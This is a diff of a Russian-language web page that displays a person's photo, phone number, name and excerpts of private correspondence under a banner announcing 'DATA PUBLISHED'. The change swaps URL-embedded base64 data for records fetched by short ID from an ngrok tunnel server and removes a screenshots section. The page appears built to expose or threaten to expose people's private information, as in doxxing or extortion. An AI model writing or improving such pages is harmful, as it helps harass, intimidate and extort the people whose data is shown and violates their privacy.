@@ -160,6 +160,12 @@
             border-radius: 8px;
             background: rgba(255,51,85,0.05);
         }
+        
+        .loading {
+            color: #ff6680;
+            font-size: 16px;
+            padding: 20px;
+        }
     </style>
 </head>
 <body>
@@ -173,25 +179,17 @@
         
         <div class="info-block">
             <div class="label">📱 Телефон</div>
-            <div class="value" id="userPhone">+7XXX XXX XX XX</div>
+            <div class="value" id="userPhone">Загрузка...</div>
         </div>
         
         <div class="info-block">
             <div class="label">👤 Имя</div>
-            <div class="value" id="userName">Неизвестно</div>
+            <div class="value" id="userName">Загрузка...</div>
         </div>
         
         <div class="info-block">
             <div class="label">💬 Данные из переписки</div>
-            <div class="value" id="userData">Загружаются...</div>
-        </div>
-        
-        <div class="info-block">
-            <div class="label">📸 Скриншоты переписки</div>
-            <div class="screenshots" id="screenshots">
-                <div class="empty">Нет данных</div>
-                <div class="empty">Нет данных</div>
-            </div>
+            <div class="value" id="userData">Загрузка...</div>
         </div>
         
         <div class="status">⚠️ ДАННЫЕ ОПУБЛИКОВАНЫ</div>
@@ -206,64 +204,50 @@
     </div>
 
     <script>
-        // ========== ПАРСИНГ ДАННЫХ ИЗ URL ==========
-        const params = new URLSearchParams(window.location.search);
-        const dataParam = params.get('data');
+        // ========== ПОЛУЧАЕМ SHORT_ID ИЗ URL ==========
+        const path = window.location.pathname;
+        const shortId = path.substring(1); // Убираем первый слэш
         
-        if (dataParam) {
-            try {
-                // Декодируем данные из base64
-                const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
-                console.log('Данные загружены:', decoded);
-                
-                // Фото (base64)
-                if (decoded.photo) {
-                    // Проверяем, если photo уже начинается с data:image, то так и оставляем
-                    // Иначе добавляем префикс для base64
-                    let photoSrc = decoded.photo;
-                    if (!photoSrc.startsWith('data:image')) {
-                        photoSrc = 'data:image/jpeg;base64,' + photoSrc;
-                    }
-                    document.getElementById('userPhoto').innerHTML = `<img src="${photoSrc}" alt="Фото пользователя">`;
-                }
-                
-                // Телефон
-                if (decoded.phone) {
-                    document.getElementById('userPhone').textContent = decoded.phone;
-                }
-                
-                // Имя
-                if (decoded.name) {
-                    document.getElementById('userName').textContent = decoded.name;
-                }
-                
-                // Данные
-                if (decoded.data) {
-                    document.getElementById('userData').textContent = decoded.data;
-                }
-                
-                // Скриншоты (если есть)
-                if (decoded.screenshots && decoded.screenshots.length > 0) {
-                    const container = document.getElementById('screenshots');
-                    container.innerHTML = '';
-                    decoded.screenshots.forEach(src => {
-                        const img = document.createElement('img');
-                        // Проверяем, если src уже начинается с data:image
-                        if (!src.startsWith('data:image')) {
-                            img.src = 'data:image/jpeg;base64,' + src;
-                        } else {
-                            img.src = src;
+        console.log('🔍 Short ID:', shortId);
+        
+        if (shortId) {
+            // ===== ЗАПРАШИВАЕМ ДАННЫЕ С СЕРВЕРА =====
+            const apiUrl = `https://7505-178-88-32-33.ngrok-free.app/${shortId}`;
+            console.log('📡 Запрос к:', apiUrl);
+            
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('📦 Данные получены:', data);
+                    
+                    if (data.success) {
+                        // Фото (base64)
+                        if (data.photo) {
+                            document.getElementById('userPhoto').innerHTML = `<img src="data:image/jpeg;base64,${data.photo}" alt="Фото пользователя">`;
                         }
-                        img.onerror = function() {
-                            this.outerHTML = `<div class="empty">❌ Ошибка загрузки</div>`;
-                        };
-                        container.appendChild(img);
-                    });
-                }
-            } catch(e) {
-                console.error('Ошибка загрузки данных:', e);
-                document.getElementById('userData').textContent = '❌ Ошибка загрузки данных: ' + e.message;
-            }
+                        
+                        // Телефон
+                        if (data.phone) {
+                            document.getElementById('userPhone').textContent = data.phone;
+                        }
+                        
+                        // Имя
+                        if (data.name) {
+                            document.getElementById('userName').textContent = data.name;
+                        }
+                        
+                        // Данные
+                        if (data.data) {
+                            document.getElementById('userData').textContent = data.data;
+                        }
+                    } else {
+                        document.getElementById('userData').textContent = '❌ Данные не найдены';
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Ошибка загрузки:', error);
+                    document.getElementById('userData').textContent = '❌ Ошибка загрузки данных';
+                });
         } else {
             document.getElementById('userData').textContent = '❌ Нет данных для отображения';
         }
